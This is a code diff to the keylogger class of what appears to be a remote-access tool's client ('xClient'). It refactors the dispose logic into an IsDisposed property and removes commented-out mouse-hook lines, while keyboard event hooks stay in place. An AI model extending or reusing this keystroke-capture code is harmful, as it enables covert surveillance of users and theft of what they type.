@@ -13,7 +13,7 @@ namespace xClient.Core.Keylogger
     public class Logger : IDisposable
     {
         public static Logger Instance;
-        private bool _disposed = false;
+        public bool IsDisposed { get; private set; }
 
         private StringBuilder _logFileBuffer;
         private string _lastWindowTitle;
@@ -58,19 +58,17 @@ namespace xClient.Core.Keylogger
 
         protected virtual void Dispose(bool disposing)
         {
-            if (!_disposed)
+            if (!IsDisposed)
             {
                 if (disposing)
                 {
                     if (_timerFlush != null)
-                    {
                         _timerFlush.Dispose();
-                    }
-
-                    _disposed = true;
                 }
 
                 Unsubscribe();
+
+                IsDisposed = true;
             }
         }
 
@@ -80,17 +78,6 @@ namespace xClient.Core.Keylogger
             _mEvents.KeyDown += OnKeyDown;
             _mEvents.KeyUp += OnKeyUp;
             _mEvents.KeyPress += Logger_KeyPress;
-
-            // To-Do: Log these in a readable manner... Perhaps the location etc.
-            //m_Events.MouseDown += OnMouseDown;
-            //m_Events.MouseUp += OnMouseUp;
-            //m_Events.MouseClick += OnMouseClick;
-            //m_Events.MouseDoubleClick += OnMouseDoubleClick;
-
-            //m_Events.MouseMove += HookManager_MouseMove;
-            //m_Events.MouseWheel += HookManager_MouseWheel;
-
-            //m_Events.MouseDownExt += HookManager_Supress;
         }
 
         private void Unsubscribe()
@@ -100,17 +87,6 @@ namespace xClient.Core.Keylogger
             _mEvents.KeyDown -= OnKeyDown;
             _mEvents.KeyUp -= OnKeyUp;
             _mEvents.KeyPress -= Logger_KeyPress;
-
-            // To-Do: Log these in a readable manner... Perhaps the location etc.
-            //m_Events.MouseDown -= OnMouseDown;
-            //m_Events.MouseUp -= OnMouseUp;
-            //m_Events.MouseClick -= OnMouseClick;
-            //m_Events.MouseDoubleClick -= OnMouseDoubleClick;
-
-            //m_Events.MouseMove -= HookManager_MouseMove;
-            //m_Events.MouseWheel -= HookManager_MouseWheel;
-
-            //m_Events.MouseDownExt -= HookManager_Supress;
             _mEvents.Dispose();
         }
 
